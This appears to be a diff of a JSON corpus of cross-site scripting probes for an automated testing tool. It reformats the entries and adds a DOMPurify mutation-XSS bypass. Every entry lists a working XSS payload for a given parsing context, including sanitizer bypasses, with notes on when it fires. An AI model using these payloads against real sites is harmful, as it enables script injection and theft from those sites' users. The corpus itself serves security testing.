@@ -2,7 +2,7 @@
   "corpus": "XSS",
   "organ": "xss-playbook",
   "vuln_class": "cross_site_scripting",
-  "corpus_version": "1.1.0",
+  "corpus_version": "1.2.0",
   "house_rules": [
     "Payloads below are transcribed from the public record and attributed per entry - this corpus never invents payloads.",
     "alert(1) in a probe stands for the operator's canary marker (MYTHOS-CANARY-<uuid>) at execution time - never ship alert() theater (organ doctrine).",
@@ -13,7 +13,9 @@
     {
       "id": "XSS-001",
       "technique": "HTML body context - element with inline event handler",
-      "prerequisites": ["reflection/insertion into HTML body element position"],
+      "prerequisites": [
+        "reflection/insertion into HTML body element position"
+      ],
       "probe": "<svg onload=alert(1)>",
       "oracle": "marker executes on load; body artifact shows the element surviving into the DOM",
       "failure_modes": [
@@ -30,7 +32,9 @@
     {
       "id": "XSS-002",
       "technique": "double-quoted attribute context breakout",
-      "prerequisites": ["insertion inside a double-quoted attribute value"],
+      "prerequisites": [
+        "insertion inside a double-quoted attribute value"
+      ],
       "probe": "\"><img src=x onerror=alert(1)>",
       "oracle": "quote closes the attribute, new element parses; marker executes on image error",
       "failure_modes": [
@@ -46,7 +50,9 @@
     {
       "id": "XSS-003",
       "technique": "unquoted attribute context / attribute injection without breakout",
-      "prerequisites": ["insertion after an unquoted attribute value or into a tag's attribute area"],
+      "prerequisites": [
+        "insertion after an unquoted attribute value or into a tag's attribute area"
+      ],
       "probe": "autofocus onfocus=alert(1)",
       "oracle": "focus fires on load without any user interaction; no quote breakout needed",
       "failure_modes": [
@@ -62,7 +68,9 @@
     {
       "id": "XSS-004",
       "technique": "JavaScript string-literal context breakout",
-      "prerequisites": ["insertion inside a JS string literal in a script block"],
+      "prerequisites": [
+        "insertion inside a JS string literal in a script block"
+      ],
       "probe": "'-alert(1)-'",
       "oracle": "string concatenation splices the marker call between string literals; executes when the statement runs",
       "failure_modes": [
@@ -78,7 +86,9 @@
     {
       "id": "XSS-005",
       "technique": "script raw-text context breakout",
-      "prerequisites": ["insertion inside a <script> block (raw text element)"],
+      "prerequisites": [
+        "insertion inside a <script> block (raw text element)"
+      ],
       "probe": "</script><img src=x onerror=alert(1)>",
       "oracle": "the closing tag ends the raw-text context whatever the string state inside; following markup parses as HTML",
       "failure_modes": [
@@ -94,7 +104,9 @@
     {
       "id": "XSS-006",
       "technique": "URL scheme context (navigational sink)",
-      "prerequisites": ["insertion into href/src/action or a redirect target"],
+      "prerequisites": [
+        "insertion into href/src/action or a redirect target"
+      ],
       "probe": "javascript:alert(1)//",
       "oracle": "navigation executes script under the origin; the // comments out any trailing template text",
       "failure_modes": [
@@ -131,7 +143,9 @@
     {
       "id": "XSS-008",
       "technique": "mXSS - svg foreign-content re-serialization (DOMPurify 2.0.0 bypass)",
-      "prerequisites": ["DOMPurify 2.0.0-era sink with default config"],
+      "prerequisites": [
+        "DOMPurify 2.0.0-era sink with default config"
+      ],
       "probe": "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">",
       "oracle": "HTML-in-SVG parse mutates the tree on serialize/re-parse; the style raw-text content re-interprets, the img escapes and executes",
       "failure_modes": [
@@ -147,7 +161,9 @@
     {
       "id": "XSS-009",
       "technique": "mXSS - MathML form-pointer namespace confusion (DOMPurify 2.0.17 bypass)",
-      "prerequisites": ["DOMPurify up to 2.0.17 with default config, innerHTML sink"],
+      "prerequisites": [
+        "DOMPurify up to 2.0.17 with default config, innerHTML sink"
+      ],
       "probe": "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
       "oracle": "the mis-nested </form> resets the form element pointer so the second <form> parses INSIDE math/mtext; serialization re-orders namespaces and the style content re-parses as HTML - img executes",
       "failure_modes": [
@@ -163,7 +179,9 @@
     {
       "id": "XSS-010",
       "technique": "mXSS - MathML mtext/table/mglyph/style with comment nesting (DOMPurify 2.0.17 bypass)",
-      "prerequisites": ["DOMPurify up to 2.0.17, innerHTML sink, HTML comment handling in play"],
+      "prerequisites": [
+        "DOMPurify up to 2.0.17, innerHTML sink, HTML comment handling in play"
+      ],
       "probe": "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;\">",
       "oracle": "mglyph puts the parser in a state where style content mutates through a comment re-serialization; the title attribute value re-parses as markup - the inner img fires",
       "failure_modes": [
@@ -179,7 +197,10 @@
     {
       "id": "XSS-011",
       "technique": "legacy backtick attribute mutation (IE-era)",
-      "prerequisites": ["legacy IE/old-Edge rendering path", "attribute-context insertion"],
+      "prerequisites": [
+        "legacy IE/old-Edge rendering path",
+        "attribute-context insertion"
+      ],
       "probe": "<img src=`x`onerror=alert(1)>",
       "oracle": "the legacy engine treats backticks as attribute delimiters - the onerror attribute parses as separate from src",
       "failure_modes": [
@@ -194,7 +215,9 @@
     {
       "id": "XSS-012",
       "technique": "single-quoted attribute context breakout",
-      "prerequisites": ["insertion inside a single-quoted attribute value"],
+      "prerequisites": [
+        "insertion inside a single-quoted attribute value"
+      ],
       "probe": "'><img src=x onerror=alert(1)>",
       "oracle": "the quote closes the attribute, a new element parses, the marker executes on image error - the same differential shape as XSS-002 with the quoting byte verified first",
       "failure_modes": [
@@ -210,7 +233,9 @@
     {
       "id": "XSS-013",
       "technique": "event-attribute handler-body assignment (marker into an existing handler)",
-      "prerequisites": ["reflection lands inside the value of an existing event-handler attribute (onload=, onerror=, onmouseover=)"],
+      "prerequisites": [
+        "reflection lands inside the value of an existing event-handler attribute (onload=, onerror=, onmouseover=)"
+      ],
       "probe": "this.id='MYTHOS-XSS-<hex>'",
       "oracle": "the host element's id mutates to the marker string when the handler fires - the marker pair (payload-marker <-> observed-marker) closes the CANARY record; the handler context needs no breakout, only valid handler-body JS",
       "failure_modes": [
@@ -227,7 +252,9 @@
     {
       "id": "XSS-014",
       "technique": "JavaScript code position (unquoted statement context)",
-      "prerequisites": ["reflection lands unquoted in executable script position (not inside a string literal)"],
+      "prerequisites": [
+        "reflection lands unquoted in executable script position (not inside a string literal)"
+      ],
       "probe": "alert(1)//",
       "oracle": "the statement executes when the block runs; the trailing // comments out whatever template text follows - execution proof rides the marker substitution rule (house rule 2)",
       "failure_modes": [
@@ -244,7 +271,9 @@
     {
       "id": "XSS-015",
       "technique": "HTML comment context breakout",
-      "prerequisites": ["reflection lands inside an HTML comment"],
+      "prerequisites": [
+        "reflection lands inside an HTML comment"
+      ],
       "probe": "--><svg onload=alert(1)>",
       "oracle": "the comment closes at the injected -->, the following element parses as markup, the marker executes on load",
       "failure_modes": [
@@ -256,6 +285,26 @@
         "credit": "canonical comment-breakout class, organ grammar cross-labeled (contexts.md HTML-comment row)",
         "title": "OWASP XSS Filter Evasion Cheat Sheet (comment-context vectors)",
         "url": "https://owasp.org/www-community/xss-filter-evasion-cheat-sheet"
+      }
+    },
+    {
+      "id": "XSS-016",
+      "technique": "mutation XSS via namespace confusion (form-pointer reset + MathML mtext/mglyph/style reparse)",
+      "prerequisites": [
+        "sink re-parses sanitizer output through innerHTML (the parse -> serialize -> reparse roundtrip)",
+        "sanitizer allowlist is namespace-blind for form/math/mtext/mglyph/style tags"
+      ],
+      "probe": "<form>\n<math><mtext>\n</form><form>\n<mglyph>\n<style></math><img src onerror=alert(1)>",
+      "oracle": "after sanitize-and-reparse the img node exists and fires onerror - the mutation happens BETWEEN serialization and the reparse, so the sanitizer never sees the img element it is about to create. alert(1) is the marker, never the impact.",
+      "failure_modes": [
+        "bypassed DOMPurify 2.0.17 when published - pin the deployed sanitizer version before burning requests on this class",
+        "sink assigns textContent instead of innerHTML - no reparse, no mutation, the vector dies quietly",
+        "sanitizer escapes angle brackets inside attributes or drops form/math from the allowlist - no namespace confusion to ride"
+      ],
+      "source": {
+        "credit": "transcribed verbatim from the discoverer's own writeup, newline layout preserved (Michal Bentkowski, securitum); the form-pointer reset is spec behavior, not a browser bug",
+        "title": "Securitum - Mutation XSS via namespace confusion (DOMPurify 2.0.17 bypass)",
+        "url": "https://securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html"
       }
     }
   ]
